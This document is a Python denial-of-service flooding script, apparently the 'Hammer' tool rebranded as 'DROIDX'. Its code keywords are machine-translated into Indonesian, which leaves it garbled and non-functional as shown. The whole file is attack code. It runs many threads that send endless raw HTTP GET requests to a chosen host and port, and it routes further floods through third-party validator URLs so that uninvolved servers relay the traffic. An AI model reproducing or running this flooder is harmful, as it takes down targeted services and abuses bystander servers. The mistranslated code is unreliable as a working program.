"""
Hak Cipta [yyyy] [nama pemilik hak cipta]
Dilisensikan di bawah Lisensi Apache, Versi 2.0 ("Lisensi");
Anda tidak boleh menggunakan file ini kecuali sesuai dengan Lisensi.
Anda dapat memperoleh salinan Lisensi di
 http://www.apache.org/licenses/LICENSE-2.0
Kecuali diwajibkan oleh hukum yang berlaku atau disetujui secara tertulis, perangkat lunak
didistribusikan di bawah Lisensi didistribusikan pada DASAR "SEBAGAIMANA ADANYA",
TANPA JAMINAN ATAU KETENTUAN APA PUN, baik tersurat maupun tersirat.
Lihat Lisensi untuk bahasa tertentu yang mengatur izin dan
batasan berdasarkan Lisensi.
"""


dari  antrian  impor  Antrian
dari  optparse impor OptionParser  
 waktu impor , sys , socket , threading , logging , urllib . permintaan , acak

def  user_agent ():
	 uagent global
	uagen = []
	uagen . append ( "Mozilla/5.0 (Linux; U; Android 4.0.3; es-es; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, seperti Gecko) Version/4.0 Safari/534.30" )
	uagen . append ( "Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, seperti Gecko) Version/4.0 Safari/534.30" )
	uagen . tambahkan ( "Mozilla/5.0 (Linux; U; Android 4.0.3; ru-ru; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, seperti Gecko) Versi/4.0 Safari/534.30" )
	kembali ( uagent )


def  my_bots ():
	 bot global
	bot = []
	bot . tambahkan ( "http://validator.w3.org/check?uri=" )
	bot . tambahkan ( "dfwdiesel.net/check?u=" )
	kembali ( bot )


def  bot_hammering ( url ):
	coba :
		sedangkan  Benar :
			req  =  urlib . permintaan . urlopen ( urllib . request . Request ( url , headers = { 'User-Agent' : random . choice ( uagent )}))
			print ( " \033 [94mDROIDX SEDANG MENYEBAR... \033 [0m" )
			waktu . tidur ( .1 )
	kecuali :
		waktu . tidur ( .1 )


def  down_it ( item ):
	coba :
		sedangkan  Benar :
			paket  =  str ( "GET / HTTP/1.1 \n Host: " + host + " \n \n User-Agent: " + random . choice ( uagen ) + " \n " + data ). enkode ( 'utf-8' )
			s  =  soket . soket ( soket . AF_INET , soket . SOCK_STREAM )
			s . menghubungkan (( host , int ( port )))
			jika  s . sendto ( paket , ( host , int ( port ))):
				s . mematikan ( 1 )
				print ( " \033 [92m" , waktu . ctime ( waktu . waktu ()), " \033 [0m \033 [94m VIRUS DROIDX TERKIRIM!   \033 [0m" )
			lain :
				s . mematikan ( 1 )
				print ( " \033 [91mshut<->bawah \033 [0m" )
			waktu . tidur ( .1 )
	kecuali  soket . kesalahan  sebagai  e :
		print ( " \033 [91m Server mati \033 [0m" )
		#print("\033[91m",e,"\033[0m")
		waktu . tidur ( .1 )


def  dos ():
	sedangkan  Benar :
		barang  =  q . dapatkan ()
		down_it ( item )
		q . tugas_selesai ()


def  dos2 ():
	sedangkan  Benar :
		barang = w . dapatkan ()
		bot_hammering ( random . pilihan ( bots ) + "http: //" + tuan rumah )
		w . tugas_selesai ()


 penggunaan def ():
	print ( ''' \033 [92m Hammod Dos Script v.1 http://www.canyalcin.com/
	Pengguna akhir bertanggung jawab untuk mematuhi semua hukum yang berlaku.
	Itu hanya untuk skrip pengujian server. IP Anda terlihat. \n
	penggunaan : python3 hammer.py [-s] [-p] [-t]
	-h : tolong
	-s : ip server
	-p : port default 80
	-t : turbo default 135 \033 [0m''' )
	sys . keluar ()


def  get_parameters ():
	 tuan rumah global
	 pelabuhan global
	global yang  thr
	 barang global
	optp  =  OptionParser ( add_help_option = False , epilog = "Palu" )
	optp . add_option ( "-q" , "--quiet" , help = "set logging to ERROR" , action = "store_const" , dest = "loglevel" , const = logging . ERROR , default = logging . INFO )
	optp . add_option ( "-s" , "--server" , dest = "host" , help = "menyerang ke server ip -s ip" )
	optp . add_option ( "-p" , "--port" , type = "int" , dest = "port" , help = "-p 80 default 80" )
	optp . add_option ( "-t" , "--turbo" , ketik = "int" , dest = "turbo" , help = "default 135 -t 135" )
	optp . add_option ( "-h" , "--help" , dest = "help" , action = 'store_true' , help = "help you" )
	memilih , args  =  optp . parse_args ()
	penebangan . basicConfig ( level = opts . loglevel , format = '%(levelname)-8s %(message)s' )
	jika  memilih . bantuan :
		penggunaan ()
	jika  memilih . tuan rumah  adalah  tidak  ada :
		tuan rumah  =  memilih . tuan rumah
	lain :
		penggunaan ()
	jika  memilih . Port  adalah  None :
		pelabuhan  =  80
	lain :
		port  =  memilih . Pelabuhan
	jika  memilih . turbo  adalah  None :
		thr  =  135
	lain :
		thr  =  memilih . turbo


# membaca header
 data global
header  =  buka ( "headers.txt" , "r" )
data  =  judul . baca ()
header . tutup ()
#antrian tugas adalah q,w
q  =  Antrian ()
w  =  Antrian ()


if  __name__  ==  '__main__' :
	if  len ( sys . argv ) <  2 :
		penggunaan ()
	get_parameters ()
	print ( " \033 [92m" , host , " port: " , str ( port ), " turbo: " , str ( thr ), " \033 [0m" )
	print ( " \033 [94mHarap tunggu... \033 [0m" )
	pengguna_agen ()
	my_bots ()
	waktu . tidur ( 5 )
	coba :
		s  =  soket . soket ( soket . AF_INET , soket . SOCK_STREAM )
		s . menghubungkan (( host , int ( port )))
		s . batas waktu yang ditentukan ( 1 )
	kecuali  soket . kesalahan  sebagai  e :
		print ( " \033 [91mperiksa ip dan port server \033 [0m" )
		penggunaan ()
	sedangkan  Benar :
		untuk  saya  dalam  jangkauan ( int ( thr )):
			t  =  benang . Utas ( target = dos )
			t . daemon  =  True   # jika utas ada, utas itu mati
			t . mulai ()
			t2  =  benang . Utas ( target = dos2 )
			t2 . daemon  =  True   # jika utas ada, utas akan mati
			t2 . mulai ()
		mulai  =  waktu . waktu ()
		#tugas
		barang  =  0
		sedangkan  Benar :
			if ( item > 1800 ): # untuk tidak ada kerusakan memori
				barang = 0
				waktu . tidur ( .1 )
			barang  =  barang  +  1
			q . menempatkan ( barang )
			w . menempatkan ( barang )
		q . bergabung ()
		w . bergabung ()